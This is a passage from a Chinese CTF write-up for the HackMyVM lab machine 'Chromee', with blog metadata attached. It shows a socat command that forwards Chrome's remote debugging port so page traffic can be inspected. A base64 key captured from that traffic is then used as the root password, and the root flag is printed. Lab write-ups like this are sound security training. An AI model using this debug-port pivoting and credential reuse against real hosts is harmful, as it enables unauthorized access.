<code>socat</code> 转发出去</p>\n<pre><code class=\"hljs language-bash\">softly@Chromee:~$ ./socat TCP-LISTEN:2222,fork tcp4:127.0.0.1:9222 &#x26;\n</code></pre>\n<p>使用 Chrome 进入调试页面 <strong><code>chrome://inspect/#devices</code></strong></p>\n<p><img src=\"/post-images/HackMyVMChromee/image8.png\" alt=\"image.png\"></p>\n<p>点击 <code>configure</code></p>\n<p><img src=\"/post-images/HackMyVMChromee/image9.png\" alt=\"image.png\"></p>\n<p><code>Done</code> 之后会出现两个 <code>URL</code></p>\n<p><img src=\"/post-images/HackMyVMChromee/image10.png\" alt=\"image.png\"></p>\n<p>点击第一个进行查看</p>\n<p><img src=\"/post-images/HackMyVMChromee/image11.png\" alt=\"image.png\"></p>\n<p>在调试页面可以看到会访问 <code>post.php</code> ,查看到载荷附带<code>key</code>值</p>\n<p><img src=\"/post-images/HackMyVMChromee/image12.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">UGhhbnRvbSBFbmdhZ2UK\n</code></pre>\n<p>进行<code>base64</code>解码后是</p>\n<p><img src=\"/post-images/HackMyVMChromee/image13.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">Phantom Engage : 幻影交战\n</code></pre>\n<p>尝试密码碰撞</p>\n<p>最后使用未解码的 <code>UGhhbnRvbSBFbmdhZ2UK</code> 成功登录</p>\n<pre><code class=\"hljs language-bash\">softly@Chromee:~$ su root\nPassword: \nroot@Chromee:/home/softly# \n</code></pre>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@Chromee:~# <span class=\"hljs-built_in\">cat</span> root.txt \nflag{e96f7a29ba633b4e43214b43d1791074}\n</code></pre>","title":"HackMyVM - Chromee","date":"2025-04-15","updated":"2025-04-15","comments":true,"tags":["HackMyVM","Linux靶机","图片隐写","Chromium"],"categories":"靶机","description":"Chromee.\n\n https://hackmyvm.eu/machines/machine.php?vm=Chromee\n \n\nNote：Have fun. :D\n\n前期踩点\n\n\n\n\n\n`23333`端口扫出来是`vsftp` \n\n\n\n\n\nvsftpd\n\n扫描出了`vsftpd`，尝试是否允许匿名用户登录\n\n\n\n不允许，先放着\n\nWeb 渗透\n\n存在 `80` 和 `8080` ，优先级 `8..."},"recentPosts":[{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"},{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"}]},"__N_SSG":true}